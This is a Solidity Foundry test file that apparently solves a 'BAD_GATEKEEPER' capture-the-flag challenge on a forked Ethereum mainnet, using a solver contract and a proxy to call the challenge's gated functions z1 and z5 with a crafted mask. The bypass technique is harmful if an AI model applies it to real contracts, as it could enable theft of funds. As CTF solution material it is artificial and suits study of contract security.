// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {IPot} from "src/IPot.sol";
import {ERC2771Context} from "@openzeppelin/contracts/metatx/ERC2771Context.sol";
import {ERC2771Forwarder} from "@openzeppelin/contracts/metatx/ERC2771Forwarder.sol";

import {EIP712} from "@openzeppelin/contracts/utils/cryptography/EIP712.sol";
import {MessageHashUtils} from "@openzeppelin/contracts/utils/cryptography/MessageHashUtils.sol";

import {Test, console} from "forge-std/Test.sol";
import {Vm} from "forge-std/Vm.sol";

import "src/BAD_GATEKEEPER/Challenge_Easy_3.sol";

contract CounterTest is Test {
    address public challenge = address(0xF15dEe25CDeF6B00b878CC9f147De4F5D4cEC761);

    Vm.Wallet public user = vm.createWallet("user");

    function setUp() public {
        vm.createSelectFork(vm.envString("ETH_RPC_URL"), 24908500);
    }

    function _testsolve3() public {
        vm.startPrank(user.addr);
        console.log("solve3");
        Challenge3Solver solver = new Challenge3Solver(challenge);        
        solver.solve();
        console.log("z5");
    }
}

contract Challenge3Solver {
    ChallengeEasy3 public challenge;
    TempProxy3 public proxy;

    constructor(address _challenge) {
        challenge = ChallengeEasy3(payable(_challenge));
        proxy = new TempProxy3();
    }

    function solve() public {
        // challenge.z1(bytes8(0x00000FFFFFFF0000), address(this));
        (bool succeed,) = address(challenge).call(
            abi.encodeWithSignature("z1(bytes8,address)", bytes8(0xFFFFF0000000FFFF), address(proxy))
        );
        require(succeed, "z1 failed");
        console.log("z1");
        // challenge.z5();
        proxy.z5(address(challenge));
    }
}
contract TempProxy3 {
    uint public nothing;
    constructor() {
        // constructor code
    }
    function z5(address challenge) public {
        address(challenge).call(
            abi.encodeWithSignature("z5()")
        );
    }
}